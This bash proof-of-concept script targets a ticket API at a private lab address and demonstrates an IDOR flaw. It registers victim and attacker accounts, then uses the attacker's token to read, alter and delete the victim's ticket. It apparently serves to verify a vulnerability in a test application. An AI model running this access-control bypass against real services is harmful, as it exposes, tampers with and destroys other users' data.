#!/bin/bash

TARGET_IP="http://192.168.200.1:8082"
SUFFIX=$RANDOM

VICTIM_EMAIL="IDOR.victim_${SUFFIX}@example.com"
ATTACKER_EMAIL="IDOR.attacker_${SUFFIX}@example.com"
PASSWORD="password"

# =======================================================================================

echo "Registering users:"
curl -s -X POST "$TARGET_IP/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$VICTIM_EMAIL\", \"password\": \"$PASSWORD\"}" > /dev/null

curl -s -X POST "$TARGET_IP/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$ATTACKER_EMAIL\", \"password\": \"$PASSWORD\"}" > /dev/null

echo "Victim: $VICTIM_EMAIL"
echo "Attacker: $ATTACKER_EMAIL"

# =======================================================================================

echo -e "\nLogging in to get tokens:"
VICTIM_TOKEN=$(curl -s -X POST "$TARGET_IP/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$VICTIM_EMAIL\", \"password\": \"$PASSWORD\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token', ''))")

ATTACKER_TOKEN=$(curl -s -X POST "$TARGET_IP/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$ATTACKER_EMAIL\", \"password\": \"$PASSWORD\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token', ''))")

if [ -z "$VICTIM_TOKEN" ] || [ -z "$ATTACKER_TOKEN" ]; then
    echo "Failed to get tokens. Exiting."
    exit 1
fi
echo "Victim token: $VICTIM_TOKEN"
echo "Attacker token: $ATTACKER_TOKEN"

# =======================================================================================

echo -e "\n1. Victim creates a secret ticket"

# Save the raw JSON response
TICKET_JSON=$(curl -s -X POST "$TARGET_IP/tickets/" \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
  "title": "Victim secret ticket",
  "description": "Victim eyes only",
  "severity": "HIGH"
}')

# print json response
echo "$TICKET_JSON" | jq .

# extract ticket id
TICKET_ID=$(echo "$TICKET_JSON" | python3 -c "import sys,json; print(json.load(sys.stdin).get('id'))")

echo "Extracted victim's ticket ID: $TICKET_ID"

# =======================================================================================

echo -e "\n2. Attacker READS the victim's ticket (IDOR on GET /{id})"
curl -s -X GET "$TARGET_IP/tickets/$TICKET_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" | jq .

# =======================================================================================

echo -e "\n3. Attacker UPDATES the victim's ticket (IDOR on PATCH /{id})"
curl -s -X PATCH "$TARGET_IP/tickets/$TICKET_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
  "title": "Changed by attacker",
  "severity": "LOW"
}' | jq .

# =======================================================================================

echo -e "\n4. Attacker DELETES the victim's ticketc (shown by HTTP 204) (IDOR on DELETE /{id})"
# using -i to show the HTTP 204 no content resp
curl -s -i -X DELETE "$TARGET_IP/tickets/$TICKET_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN"

# =======================================================================================
